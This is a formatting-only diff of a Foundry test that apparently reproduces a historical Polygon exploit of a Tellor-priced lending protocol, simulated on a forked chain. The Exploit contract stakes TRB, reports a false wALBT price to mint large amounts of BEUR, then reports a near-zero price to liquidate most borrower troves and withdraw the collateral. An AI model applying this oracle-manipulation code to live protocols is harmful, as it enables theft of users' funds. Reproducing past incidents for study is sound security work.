@@ -48,12 +48,12 @@ contract Attacker is Test {
     IERC20 constant TRB = IERC20(0xE3322702BEdaaEd36CdDAb233360B939775ae5f1);
     IERC20 constant WALBT = IERC20(0x35b2ECE5B1eD6a7a99b83508F8ceEAB8661E0632);
     IERC20 constant BEUR = IERC20(0x338Eb4d394a4327E5dB80d08628fa56EA2FD4B81);
-    
+
     Exploit exploit;
 
     function testExploit() public {
         // Full simulation, run Tx1 and Tx2
-        vm.createSelectFork("polygon", 38792977);
+        vm.createSelectFork("polygon", 38_792_977);
         exploit = new Exploit();
 
         // Pre-works, check out: https://polygonscan.com/address/0xed596991ac5f1aa1858da66c67f7cfa76e54b5f1#tokentxns
@@ -62,8 +62,8 @@ contract Attacker is Test {
 
         exploit.tx1_mintMassiveAmountOfBEUR();
 
-        vm.roll(38793028);
-        vm.warp(1675276266);
+        vm.roll(38_793_028);
+        vm.warp(1_675_276_266);
 
         exploit.tx2_liquidateMassiveAmountOfALBT();
 
@@ -74,7 +74,7 @@ contract Attacker is Test {
 
     function testAttackTx1() public {
         // Only run attack Tx1
-        vm.createSelectFork("polygon", 38792977);        
+        vm.createSelectFork("polygon", 38_792_977);
         exploit = new Exploit();
 
         deal(address(TRB), address(exploit), 10e18);
@@ -88,7 +88,7 @@ contract Attacker is Test {
 
     function testAttackTx2() public {
         // Only run attack Tx2
-        vm.createSelectFork("polygon", 38793028);        
+        vm.createSelectFork("polygon", 38_793_028);
         exploit = new Exploit();
 
         deal(address(TRB), address(exploit), 20e18);
@@ -108,11 +108,12 @@ contract Exploit is Test {
     IERC20 constant TRB = IERC20(0xE3322702BEdaaEd36CdDAb233360B939775ae5f1);
     IERC20 constant WALBT = IERC20(0x35b2ECE5B1eD6a7a99b83508F8ceEAB8661E0632);
     IERC20 constant BEUR = IERC20(0x338Eb4d394a4327E5dB80d08628fa56EA2FD4B81);
-    
+
     address maliciousTrove;
     address maliciousTrove2;
 
-    function tx1_mintMassiveAmountOfBEUR() public { // func_0xa11ce20c
+    function tx1_mintMassiveAmountOfBEUR() public {
+        // func_0xa11ce20c
         console.log("Update wALBT price to extremely high");
         PriceReporter Reporter = new PriceReporter();
         TRB.transfer(address(Reporter), TellorFlex.getStakeAmount()); // transfer 10 TRB to price reporter
@@ -130,24 +131,26 @@ contract Exploit is Test {
         ITrove(maliciousTrove2).increaseCollateral(0, address(0));
     }
 
-    function tx2_liquidateMassiveAmountOfALBT() public { // func_0x770344d9
+    function tx2_liquidateMassiveAmountOfALBT() public {
+        // func_0x770344d9
         console.log("Update wALBT price to extremely low");
         PriceReporter Reporter = new PriceReporter();
         TRB.transfer(address(Reporter), TellorFlex.getStakeAmount()); // transfer 10 TRB to price reporter
         Reporter.updatePrice(10e18, 0.0000001 * 1e18);
-        
+
         console.log("Get all trove addresses");
         address[] memory troves = new address[](45);
         troves[0] = BonqProxy.firstTrove(address(WALBT));
         troves[44] = BonqProxy.lastTrove(address(WALBT));
         require(troves[44] == 0x5343c5d0af82b89DF164A9e829A7102c4edB5402, "Last trove creator is not attacker"); // note: assert troves[44] is maliciousTrove2
 
-        for(uint i=1; i < troves.length; ++i){ // troves[1] ~ troves[44]
-            troves[i] = BonqProxy.nextTrove(address(WALBT), troves[i-1]);
+        for (uint256 i = 1; i < troves.length; ++i) {
+            // troves[1] ~ troves[44]
+            troves[i] = BonqProxy.nextTrove(address(WALBT), troves[i - 1]);
         }
 
         console.log("Liqudate all borrowers");
-        for(uint i=1; i < troves.length - 1; ++i){
+        for (uint256 i = 1; i < troves.length - 1; ++i) {
             address target = troves[i];
             require(BonqProxy.containsTrove(address(WALBT), target)); // check target exists before exploit
             uint256 debt = ITrove(target).debt();
@@ -162,7 +165,7 @@ contract Exploit is Test {
         ITrove(troves[44]).repay(type(uint256).max, address(0));
         uint256 walbt_in_attacker_trove = WALBT.balanceOf(troves[44]);
         emit log_named_decimal_uint("[debug] WALBT balance in attacker's trove", walbt_in_attacker_trove, 18);
-        
+
         console.log("Withdraw wALBT to Exploit contract");
         address maliciousTrove2_owner = ITrove(troves[44]).getRoleMember(keccak256("OWNER_ROLE"), 0);
         vm.prank(maliciousTrove2_owner);
@@ -170,23 +173,22 @@ contract Exploit is Test {
     }
 
     function updatePrice(uint256 _tokenId, uint256 _price) public {
-        bytes memory queryData = hex"00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000953706f745072696365000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000004616c62740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000037573640000000000000000000000000000000000000000000000000000000000"; // not sure what this means
+        bytes memory queryData =
+            hex"00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000953706f745072696365000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000004616c62740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000037573640000000000000000000000000000000000000000000000000000000000"; // not sure what this means
         bytes32 queryId = keccak256(queryData);
-        bytes memory price =  abi.encodePacked(_price);
+        bytes memory price = abi.encodePacked(_price);
         TRB.approve(address(TellorFlex), type(uint256).max);
         TellorFlex.depositStake(_tokenId);
         TellorFlex.submitValue(queryId, price, 0, queryData);
     }
-
 }
 
 contract PriceReporter is Test {
     function updatePrice(uint256 _tokenId, uint256 _price) public {
-        (bool suc, ) = msg.sender.delegatecall(abi.encodeWithSignature("updatePrice(uint256,uint256)", _tokenId, _price));
+        (bool suc,) = msg.sender.delegatecall(abi.encodeWithSignature("updatePrice(uint256,uint256)", _tokenId, _price));
         require(suc, "Update price failed");
     }
 }
-
 
 /*---------- Interface ----------*/
 interface ITellorFlex {
@@ -210,15 +212,15 @@ interface ITellorFlex {
     function depositStake(uint256 _amount) external;
     function getBlockNumberByTimestamp(bytes32 _queryId, uint256 _timestamp) external view returns (uint256);
     function getCurrentValue(bytes32 _queryId) external view returns (bytes memory _value);
-    function getDataBefore(bytes32 _queryId, uint256 _timestamp)
-        external
-        view
-        returns (bool _ifRetrieve, bytes memory _value, uint256 _timestampRetrieved);
+    function getDataBefore(
+        bytes32 _queryId,
+        uint256 _timestamp
+    ) external view returns (bool _ifRetrieve, bytes memory _value, uint256 _timestampRetrieved);
     function getGovernanceAddress() external view returns (address);
-    function getIndexForDataBefore(bytes32 _queryId, uint256 _timestamp)
-        external
-        view
-        returns (bool _found, uint256 _index);
+    function getIndexForDataBefore(
+        bytes32 _queryId,
+        uint256 _timestamp
+    ) external view returns (bool _found, uint256 _index);
     function getNewValueCountbyQueryId(bytes32 _queryId) external view returns (uint256);
     function getPendingRewardByStaker(address _stakerAddress) external returns (uint256 _pendingReward);
     function getRealStakingRewardsBalance() external view returns (uint256);
@@ -227,10 +229,10 @@ interface ITellorFlex {
     function getReporterLastTimestamp(address _reporter) external view returns (uint256);
     function getReportingLock() external view returns (uint256);
     function getReportsSubmittedByAddress(address _reporter) external view returns (uint256);
-    function getReportsSubmittedByAddressAndQueryId(address _reporter, bytes32 _queryId)
-        external
-        view
-        returns (uint256);
+    function getReportsSubmittedByAddressAndQueryId(
+        address _reporter,
+        bytes32 _queryId
+    ) external view returns (uint256);
     function getStakeAmount() external view returns (uint256);
     function getStakerInfo(address _stakerAddress)
         external
@@ -332,11 +334,19 @@ interface IOriginalTroveFactory {
         uint256 _borrowAmount,
         address _nextTrove
     ) external;
-    function emitLiquidationEvent(address _token, address _trove, address stabilityPoolLiquidation, uint256 collateral)
-        external;
+    function emitLiquidationEvent(
+        address _token,
+        address _trove,
+        address stabilityPoolLiquidation,
+        uint256 collateral
+    ) external;
     function emitTroveCollateralUpdate(address _token, uint256 _newAmount, uint256 _newCollateralization) external;
-    function emitTroveDebtUpdate(address _token, uint256 _newAmount, uint256 _newCollateralization, uint256 _feePaid)
-        external;
+    function emitTroveDebtUpdate(
+        address _token,
+        uint256 _newAmount,
+        uint256 _newCollateralization,
+        uint256 _feePaid
+    ) external;
     function feeRecipient() external view returns (address);
     function firstTrove(address _token) external view returns (address);
     function getBorrowingFee(uint256 _amount) external view returns (uint256);
@@ -434,9 +444,10 @@ interface ITrove {
     function netDebt() external view returns (uint256);
     function owner() external view returns (address);
     function recordedCollateral() external view returns (uint256);
-    function redeem(address _recipient, address _newNextTrove)
-        external
-        returns (uint256 _stableAmount, uint256 _collateralRecieved);
+    function redeem(
+        address _recipient,
+        address _newNextTrove
+    ) external returns (uint256 _stableAmount, uint256 _collateralRecieved);
     function removeOwner(address _ownerToRemove) external;
     function renounceOwnership() external;
     function renounceRole(bytes32 role, address account) external;
@@ -450,4 +461,3 @@ interface ITrove {
     function unclaimedArbitrageReward() external view returns (uint256);
     function unclaimedCollateralRewardAndDebt() external view returns (uint256, uint256);
 }
-
